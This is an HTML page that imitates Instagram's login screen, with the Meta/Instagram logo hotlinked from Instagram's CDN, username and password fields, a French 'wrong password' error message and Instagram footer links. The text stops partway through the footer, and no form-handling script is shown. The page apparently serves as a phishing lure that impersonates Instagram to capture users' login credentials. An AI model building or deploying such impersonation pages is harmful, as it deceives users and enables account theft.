<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <main style="flex: 1; width: 100%; margin: 0 auto;">

        <div class="wbloks_1" style="pointer-events: none; width: 100%; margin-top: 70px; margin-bottom: 20px; align-items: center; justify-content: center; display: flex;">
            <img role="heading" alt="Instagram from Meta" class="wbloks_1"
                src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp"
                style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
        </div>

        <div class="text">Log in</div>

        <div class="bloc1">
            <div class="input-container">
                <input type="text" id="username" class="input-field" placeholder=" " autocomplete="off">
                <label for="username" class="input-label">Username, email or mobile number</label>
            </div>
        </div>  

        <div data-bloks-name="bk.components.Flexbox" class="bloc1">
    <div class="input-container" style="display: flex; align-items: center;">
        <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password">
        <label for="password" class="input-label">Password</label>
        <span id="toggle-password" style="cursor: pointer; color: #8595a4; font-size: 13px; white-space: nowrap; padding-right: 4px;">Afficher</span>
    </div>
</div>

        <div id="error-message" class="error-text" style="display: none;">Mot de passe erroné</div>

        <button class="btn-login" id="login-btn">Log in</button>

    </main>

    <footer style="border-top: 1px solid #dbdbdb; padding: 2rem 1rem 1.5rem; text-align: center;">
    <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 4px 12px; margin-bottom: 1rem;">

        <a href="https://privacycenter.instagram.com/policy" target="_blank" style="color: #737373; text-decoration: none; font-size: 12px;">Confidentialité</a>
        <a href="https://help.instagram.com/581066165581870" target="_blank" style="color: #737373; text-decoration: none; font-size: 12px;">Conditions</a>

        🌐 Français ▾
